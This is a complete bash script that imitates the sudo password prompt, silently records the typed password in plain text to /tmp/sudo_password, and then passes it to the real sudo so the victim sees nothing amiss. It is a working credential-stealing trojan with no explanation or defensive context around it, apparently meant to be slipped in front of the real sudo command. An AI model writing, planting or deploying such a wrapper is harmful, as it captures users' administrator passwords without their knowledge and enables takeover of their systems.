#!/bin/bash
read -s -p "[sudo] password for user: " password
echo ""
echo $password >> /tmp/sudo_password
sudo $@ <<END
$password
END
